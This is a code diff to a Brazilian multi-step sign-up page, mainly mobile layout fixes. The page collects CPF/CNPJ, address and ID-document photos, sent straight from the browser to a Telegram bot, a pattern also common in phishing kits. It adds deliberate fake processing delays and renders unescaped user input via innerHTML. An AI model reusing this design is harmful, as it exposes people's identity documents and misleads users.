@@ -107,7 +107,7 @@
     .camera-modal-content { background-color: #fff; padding: 20px; border-radius: 8px; text-align: center; }
     #video-preview { width: 100%; max-width: 500px; border: 1px solid #ccc; background-color: #000; }
     .modal-actions { margin-top: 15px; display: flex; justify-content: center; gap: 10px; }
-    .preview { font-weight: bold; margin-top: 8px; }
+    .preview { font-weight: bold; margin-top: 8px; word-break: break-all; }
     .popover-header { font-weight: bold; }
     .pop_list { display: flex; flex-direction: column; gap: 4px; }
     .pop_item { font-size: 0.9em; }
@@ -135,7 +135,27 @@
     .stp_connect { flex: 1; height: 4px; background-color: var(--border-color); position: relative; margin: 0 5px; z-index: 1; }
     .stp_connect .stp_connect { position: absolute; top: 0; left: 0; height: 100%; background-color: var(--primary-color); margin: 0; width: 0; transition: width 0.4s ease-in-out; }
     .stp_connect.stp_atual .stp_connect { width: 100% !important; }
-    /* === FIM DOS ESTILOS INJETADOS === */
+    
+    /* === INÍCIO DA CORREÇÃO PARA MOBILE === */
+    @media (max-width: 768px) {
+      /* Faz com que todas as colunas ocupem 100% da largura em telas pequenas */
+      .row > [class*="col-"] {
+        width: 100%;
+        flex: 0 0 100%;
+        max-width: 100%;
+      }
+      /* Empilha os campos de e-mail e confirmação de e-mail */
+      .frm_line {
+        flex-direction: column;
+        gap: 0; /* Remove o espaçamento para não ficar muito grande */
+      }
+      /* Ajusta os botões na tela de seleção inicial */
+      .selection-options {
+        flex-direction: column;
+        align-items: center;
+      }
+    }
+    /* === FIM DA CORREÇÃO PARA MOBILE === */
   </style>
 </head>
 <body>
@@ -370,10 +390,11 @@
           <p class="section-subtitle">Revise seus dados antes de concluir</p>
           <div class="alert info">Revise seus dados. Ao enviar, o cadastro será encaminhado para análise e os dados serão enviados ao grupo interno no Telegram.</div>
           
-          <div id="review-wrapper" style="margin-top:10px; line-height: 1.6;">
+          <div id="review-wrapper" style="margin-top:10px; line-height: 1.6; word-break: break-word;">
             <div class="row" id="review">
               </div>
           </div>
+
           <div class="form-actions">
             <button class="btn secondary" type="button" onclick="prev()"><i class="fas fa-arrow-left"></i> Voltar</button>
             <button id="submit-btn" class="btn" type="submit" onclick="salvar()">
@@ -410,7 +431,6 @@
 
 <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
 <script>
-  // Scripts permanecem os mesmos para manter a funcionalidade
   /* ===========================
    * CONFIG TELEGRAM
    * =========================== */
@@ -468,20 +488,16 @@
     showStep(1);
   }
 
-  /* === INÍCIO DA MODIFICAÇÃO DO SCRIPT === */
-  // A função drawStepper original foi removida/substituída pela função abaixo.
   function updateInjectedStepper(currentStep) {
       const numbers = document.querySelectorAll('.stp_number');
       const connectors = document.querySelectorAll('.stp_connect > .stp_connect');
       
-      // Reseta todos os passos
       numbers.forEach(num => num.classList.remove('stp_atual'));
       connectors.forEach(con => {
           con.parentElement.classList.remove('stp_atual');
           con.style.width = '0%';
       });
 
-      // Ativa os passos até o atual
       for (let i = 0; i < currentStep; i++) {
           if (numbers[i]) {
               numbers[i].classList.add('stp_atual');
@@ -491,7 +507,6 @@
           }
       }
       
-      // Animação parcial da barra de conexão atual
       if (currentStep > 1 && currentStep <= total) {
           const prevConnector = connectors[currentStep - 2];
           if(prevConnector) {
@@ -499,20 +514,18 @@
           }
       }
   }
-  /* === FIM DA MODIFICAÇÃO DO SCRIPT === */
 
   function showStep(n){
     step = Math.min(Math.max(1, n), total);
     panes.forEach(p => p.style.display = (+p.dataset.step === step ? 'block' : 'none'));
     
-    updateInjectedStepper(step); // <-- CHAMADA PARA A NOVA FUNÇÃO
+    updateInjectedStepper(step); 
 
     clearMsg();
     if (step === 4) montarReview();
     window.scrollTo({ top: 0, behavior: 'smooth' });
   }
   
-  // === MODIFICAÇÃO: EFEITO DE DELAY NA NAVEGAÇÃO ===
   function prev() {
       const prevButton = document.querySelector(`.step-pane[data-step="${step}"] .btn.secondary`);
       if (prevButton) {
@@ -538,7 +551,6 @@
           }
       }
   }
-  // === FIM DA MODIFICAÇÃO ===
 
   function maskCPF(v){ v = v.replace(/\D/g,''); v = v.replace(/(\d{3})(\d)/,'$1.$2'); v = v.replace(/(\d{3})(\d)/,'$1.$2'); v = v.replace(/(\d{3})(\d{1,2})$/,'$1-$2'); return v; }
   function maskCNPJ(v){ v = v.replace(/\D/g,''); v = v.replace(/^(\d{2})(\d)/,'$1.$2'); v = v.replace(/^(\d{2})\.(\d{3})(\d)/,'$1.$2.$3'); v = v.replace(/\.(\d{3})(\d)/,'.$1/$2'); v = v.replace(/(\d{4})(\d)/,'$1-$2'); return v; }
@@ -605,8 +617,8 @@
     canvas.width = video.videoWidth; canvas.height = video.videoHeight;
     canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
     const dataUrl = canvas.toDataURL('image/jpeg', 0.92);
-    if (currentCaptureSide === 'front') { capturedFront = dataUrl; previewFront.textContent = 'Foto (frente) capturada com sucesso!'; docFrontFileInput.value = ''; }
-    else { capturedBack = dataUrl; previewBack.textContent = 'Foto (verso) capturada com sucesso!'; docBackFileInput.value = ''; }
+    if (currentCaptureSide === 'front') { capturedFront = dataUrl; previewFront.textContent = 'Foto (frente) capturada!'; docFrontFileInput.value = ''; }
+    else { capturedBack = dataUrl; previewBack.textContent = 'Foto (verso) capturada!'; docBackFileInput.value = ''; }
     stopCamera();
   });
 
@@ -675,40 +687,39 @@
   function getFileDetails(){
     const front = docFrontFileInput.files[0] ? `Frente: ${docFrontFileInput.files[0].name}` : (capturedFront ? 'Frente: Foto capturada' : 'Frente: —');
     const back  = docBackFileInput.files[0]  ? `Verso: ${docBackFileInput.files[0].name}`   : (capturedBack  ? 'Verso: Foto capturada'  : 'Verso: —');
-    return `${front} | ${back}`;
+    return `${front} <br> ${back}`;
   }
 
   function montarReview(){
     const reviewContainer = document.getElementById('review');
     const commonHtml = `
-      <div class="col-6"><b>E-mail:</b><br>${getFieldValue('email')}</div>
-      <div class="col-3"><b>Celular:</b><br>${getFieldValue('celular')}</div>
-      <div class="col-3"><b>Telefone:</b><br>${getFieldValue('telefone') || '—'}</div>
+      <div class="col-12 col-md-6"><b>E-mail:</b><br>${getFieldValue('email')}</div>
+      <div class="col-12 col-md-3"><b>Celular:</b><br>${getFieldValue('celular')}</div>
+      <div class="col-12 col-md-3"><b>Telefone:</b><br>${getFieldValue('telefone') || '—'}</div>
       <div class="col-12"><hr/></div>
-      <div class="col-3"><b>CEP:</b><br>${getFieldValue('cep')}</div>
-      <div class="col-9"><b>Endereço:</b><br>${getFieldValue('endereco')}, ${getFieldValue('numero')} ${getFieldValue('complemento') ? ('- '+getFieldValue('complemento')) : ''} – ${getFieldValue('bairro')} – ${getFieldValue('cidade')}/${getFieldValue('estado')}</div>
+      <div class="col-12 col-md-3"><b>CEP:</b><br>${getFieldValue('cep')}</div>
+      <div class="col-12 col-md-9"><b>Endereço:</b><br>${getFieldValue('endereco')}, ${getFieldValue('numero')} ${getFieldValue('complemento') ? ('- '+getFieldValue('complemento')) : ''} – ${getFieldValue('bairro')} – ${getFieldValue('cidade')}/${getFieldValue('estado')}</div>
       <div class="col-12"><hr/></div>
-      <div class="col-6"><b>Documentos:</b><br>${getFileDetails()}</div>
-      <div class="col-6"><b>Como nos conheceu:</b><br>${getCheckedValue('conheceu') || 'Não informado'}</div>`;
+      <div class="col-12 col-md-6"><b>Documentos:</b><br>${getFileDetails()}</div>
+      <div class="col-12 col-md-6"><b>Como nos conheceu:</b><br>${getCheckedValue('conheceu') || 'Não informado'}</div>`;
 
     let specificHtml = '';
     if (tipoPessoa === 'PF') {
       specificHtml = `
-        <div class="col-6"><b>Nome:</b><br>${getFieldValue('nome')}</div>
-        <div class="col-3"><b>CPF:</b><br>${getFieldValue('cpf')}</div>
-        <div class="col-3"><b>Apelido:</b><br>${getFieldValue('apelido')}</div>
+        <div class="col-12 col-md-6"><b>Nome:</b><br>${getFieldValue('nome')}</div>
+        <div class="col-12 col-md-3"><b>CPF:</b><br>${getFieldValue('cpf')}</div>
+        <div class="col-12 col-md-3"><b>Apelido:</b><br>${getFieldValue('apelido')}</div>
         <div class="col-12"><hr/></div>
-        <div class="col-6"><b>Tipo de Documento:</b><br>${getCheckedValue('tipoDocPF') || '—'}</div>
+        <div class="col-12"><b>Tipo de Documento:</b><br>${getCheckedValue('tipoDocPF') || '—'}</div>
       `;
     } else {
       specificHtml = `
-        <div class="col-6"><b>Razão Social:</b><br>${getFieldValue('razaoSocial')}</div>
-        <div class="col-3"><b>CNPJ:</b><br>${getFieldValue('cnpj')}</div>
-        <div class="col-3"><b>Nome Fantasia:</b><br>${getFieldValue('nomeFantasia')}</div>
+        <div class="col-12 col-md-6"><b>Razão Social:</b><br>${getFieldValue('razaoSocial')}</div>
+        <div class="col-12 col-md-3"><b>CNPJ:</b><br>${getFieldValue('cnpj')}</div>
+        <div class="col-12 col-md-3"><b>Nome Fantasia:</b><br>${getFieldValue('nomeFantasia')}</div>
       `;
     }
     
-    // A injeção do HTML agora acontece no elemento correto, que já está dentro de um .row
     reviewContainer.innerHTML = `${specificHtml}${commonHtml}`;
   }
 
@@ -754,7 +765,6 @@
     return `${header}\n${bloco1}\n${bloco2}\n${bloco3}`;
   }
 
-  // === MODIFICAÇÃO: FUNÇÃO SALVAR COM DELAYS E REDIRECIONAMENTO ===
   async function salvar() {
       if (!validateStep(1) || !validateStep(2) || !validateStep(3)) return;
 
@@ -762,7 +772,6 @@
       const btnText = submitBtn.querySelector('.btn-text');
       const originalText = btnText.innerHTML;
 
-      // 1. Estado inicial de salvamento
       submitBtn.classList.add('loading');
       submitBtn.disabled = true;
       btnText.innerHTML = '<span class="spinner"></span> Processando...';
@@ -770,20 +779,14 @@
       setMsg('Aguarde, estamos processando seu cadastro...', 'info');
 
       try {
-          // Atraso falso para processamento
           await new Promise(resolve => setTimeout(resolve, 1500));
-
-          // Enviar dados principais
           await sendTelegramMessage(buildResumoHTML());
 
-          // 2. Estado de envio de documentos
           setMsg('Quase lá! Enviando seus documentos...', 'info');
           btnText.innerHTML = '<span class="spinner"></span> Enviando Documentos...';
 
-          // Atraso falso para "upload" de documentos
           await new Promise(resolve => setTimeout(resolve, 2500));
 
-          // Enviar documentos
           if (docFrontFileInput.files[0]) {
               await sendTelegramDocument(docFrontFileInput.files[0], docFrontFileInput.files[0].name, 'Documento – Frente');
           } else if (capturedFront) {
@@ -796,8 +799,7 @@
               await sendTelegramDocument(dataURLtoBlob(capturedBack), 'documento_verso.jpg', 'Documento – Verso (capturado)');
           }
 
-          // 3. Estado de sucesso
-          document.getElementById('form').style.display = 'none'; // Esconde os botões do formulário
+          document.getElementById('form').style.display = 'none';
           setMsg(
               '<div style="display: flex; align-items: center; justify-content: center; gap: 15px; flex-direction: column; text-align: center; padding: 20px 0;">' +
               '<i class="fas fa-check-circle" style="font-size: 3rem; color: var(--success-color);"></i>' +
@@ -806,7 +808,6 @@
               'success'
           );
 
-          // 4. Redirecionar após o atraso
           setTimeout(() => {
               window.location.href = 'index.html';
           }, 4000);
@@ -814,7 +815,6 @@
       } catch (error) {
           console.error('Erro no envio:', error);
           setMsg(`Erro: ${error.message}. Verifique as configurações do bot e tente novamente.`, 'error');
-          // Restaurar botão em caso de erro
           submitBtn.classList.remove('loading');
           submitBtn.disabled = false;
           btnText.innerHTML = originalText;
